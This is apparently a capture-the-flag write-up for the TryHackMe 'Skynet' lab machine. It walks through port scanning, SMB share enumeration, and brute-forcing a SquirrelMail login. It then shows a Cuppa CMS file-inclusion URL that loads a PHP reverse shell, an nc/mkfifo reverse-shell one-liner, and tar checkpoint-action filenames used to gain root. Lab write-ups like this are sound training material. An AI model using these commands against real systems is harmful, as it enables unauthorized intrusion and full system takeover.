## Skynet 

Room link: https://tryhackme.com/room/skynet

# Scanning 
I started with an aggressive NMAP scan using the ```-A``` option. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [REDACTED]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-21 20:40 EST
Nmap scan report for [REDACTED]
Host is up (0.091s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP SASL CAPA AUTH-RESP-CODE PIPELINING UIDL RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more LOGINDISABLEDA0001 have post-login IMAP4rev1 listed LOGIN-REFERRALS IDLE capabilities ID LITERAL+ Pre-login ENABLE SASL-IR OK
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-02-21T19:41:08-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-22T01:41:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.19 seconds
```
A full nmap scan with ```-p-``` also returned the same results. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -p- 10.10.100.158
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-21 20:41 EST
Nmap scan report for 10.10.100.158
Host is up (0.091s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 58.15 seconds
```

# Enumeration
I checked out the http service and I found some interesting directories. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ gobuster -u [REDACTED] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[REDACTED]/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/directory-list-1.0.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/21 20:42:50 Starting gobuster
=====================================================
/admin (Status: 301)
/ai (Status: 301)
/config (Status: 301)
/squirrelmail (Status: 301)
/css (Status: 301)
/js (Status: 301)
=====================================================
2022/02/21 21:07:52 Finished
=====================================================
```
I first went after the SMB portion of the machine. I used smbmap to scan for available shares. 
```
ajread@aj-ubuntu:~/TryHackMe$ smbmap -H [REDACTED]
[+] Guest session   	IP: [REDACTED]:445	Name: [REDACTED]                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```
It looked like there is a user name milesdyson on the system. Then, I looked at the anonymous share. 
```
ajread@aj-ubuntu:~/TryHackMe$ smbclient -U anonymous //[REDACTED]/anonymous
Enter WORKGROUP\anonymous's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

		9204224 blocks of size 1024. 5831532 blocks available

```
There was an attention.txt file and a folder of logs. 
```
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

		9204224 blocks of size 1024. 5831532 blocks available
smb: \logs\> 
```
Looking at the log files, only log1.txt has data, which appeared to be passwords to use for cracking credentials. I will definitely keep these in mind. Could they be used for milesdyson user? 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
Remembering the enumeration I did with gobuster, I went back to the ```/squirrelmail``` directory. What if the log1.txt was a list of passwords to try as user milesdyson? The ```attention.txt``` file affirmed my suspicion. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
So, I set up burpsuite intruder to use multiple payloads against the ```secretkey=``` position of the POST request to the squirrelmail service. See the POST request to log in below. As seen, I logged in as user ```milesdyson``` with password ```test```.
```
POST /squirrelmail/src/redirect.php HTTP/1.1
Host: [REDACTED]
Content-Length: 81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://[REDACTED]
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[REDACTED]/squirrelmail/src/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: squirrelmail_language=en_US; SQMSESSID=5mm2c9p7ak17sdfaohfiupk0m0
Connection: close

login_username=milesdyson&secretkey=§test§&js_autodetect_results=1&just_logged_in=1
```
I loaded in log1.txt as the payload in intruder and ran. There are a total of 31 possible passwords in the log1.txt file. Burpsuite took some time to run against the target but I eventually found the password based on the 302 response from the service. With the password, I logged into the mail service as user milesdyson. 
```
HTTP/1.1 302 Found
Date: Thu, 24 Feb 2022 18:47:51 GMT
Server: Apache/2.4.18 (Ubuntu)
Expires: Sat, 1 Jan 2000 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
```
There are total of 3 emails within the user milesdyons's inbox. Two of them are from serenakogan. One of the emails from her is in binary. The other appears to be song lyrics. But, one of the emails in milesdyson's inbox from skynet@skynet provided smb credentials to use.
```
We have changed your smb password after system malfunction.
Password: [REDACTED]
```
I used the credentials to log into the ```milesdyson``` share that I saw earlier. 
```
ajread@aj-ubuntu:~/TryHackMe$ smbclient -U milesdyson //[REDACTED]/milesdyson
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> 
```
There are a bunch of files within the share. But, the most interesting file was the ```important.txt``` file within the ```notes``` directory. 
```
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

		9204224 blocks of size 1024. 5831456 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

		9204224 blocks of size 1024. 5831456 blocks available
```
The ```important.txt``` file pointed to a CMS on the system. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat important.txt 

1. Add features to beta CMS [REDACTED]
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
I used curl to initially investigate the CMS. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ curl http://[REDACTED]/[REDACTED]/
<html>
<head>
<style>
body {
  color: white;
}
</style>
</head>
<body bgcolor="black">
<center><br />
<img src='miles.jpg'>
<h2>Miles Dyson Personal Page</h2><p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br /> a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
</center>
</body>
</html>
```
It didnt look like anything special was on the first page. I ran gobuster against the site and found some more interesting directories to investigate. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ gobuster -u http://[REDACTED]/[REDACTED]/ -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[REDACTED]/[REDACTED]/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/02/24 14:15:01 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/administrator (Status: 301)
/index.html (Status: 200)
=====================================================
2022/02/24 14:15:50 Finished
=====================================================
```
When I navigated to the /administrator page, I was presented with a login screen for Cuppa CMS. I did some googling to find that there is a remote/local file inclusion vulnerability with Cuppa CMS (https://www.exploit-db.com/exploits/25971).
# Initial Access
With the LFI/RFI vulnerability, I set up a php reverse shell using pentest monkey (https://pentestmonkey.net/tools/web-shells/php-reverse-shell), changing the IP and port as needed. Then, I started a python http server on my local machine in the directory where the reverse shell is stored.
```
ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
```
I made sure to set up a netcat listener on my local machine. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
Listening on 0.0.0.0 9999
```
Then, I navigated to the LFI/RFI vulnerable location for the CMS and input the location of my local machine and grabbed the reverse shell.
```
http://[REDACTED]/[REDACTED]/administrator/alerts/alertConfigField.php?urlConfig=http://[REDACTED]:80/php-reverse-shell.php
```
And, it dropped me into a shell!
```
ajread@aj-ubuntu:~/TryHackMe/practice$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [REDACTED] 33456
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 13:28:52 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
I could also see the machine call out to my local machine. 
```
ajread@aj-ubuntu:~/resources/revshells$ sudo python -m http.server 80
[sudo] password for ajread: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
[REDACTED] - - [24/Feb/2022 14:28:51] "GET /php-reverse-shell.php HTTP/1.0" 200 -
```
Then, I was able to find the user flag.
```
$ wc -c user.txt
33 user.txt
```
# Privilege Escalation 
Within the home directory of milesdyson, there was an interesting backup file that is executed by root. 
```
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
It looked like the shell script moves to the location of the website and compresses everything as a method of backup. I found this website that explains an exploit for tar using checkpoints(https://swepstopia.com/wildcards-tar-and-checkpoints/). According to the site, I first needed to create a shell script and place it in the location where the tar takes place. The shell script would call back to my local machine at a specific port. 
```
www-data@skynet:/var/www/html$ echo -n "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
<ifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [REDACTED] 4444 >/tmp/f" > shell.sh
```
Then, I had to set up a checkpoint action that would execute the shell script. 
```
www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
<ml$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"  
```
I set up a netcat listener to handle the shell script calling from the victim. 
```
ajread@aj-ubuntu:~/TryHackMe/$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```
Finally, I executed the checkpoint, which called the shell script. 
```
www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint=1"
```
My netcat listener picked up the call and I dropped into a shell with root privileges. 
```
ajread@aj-ubuntu:~/TryHackMe/$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.0.103 55152
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
33 /root/root.txt
```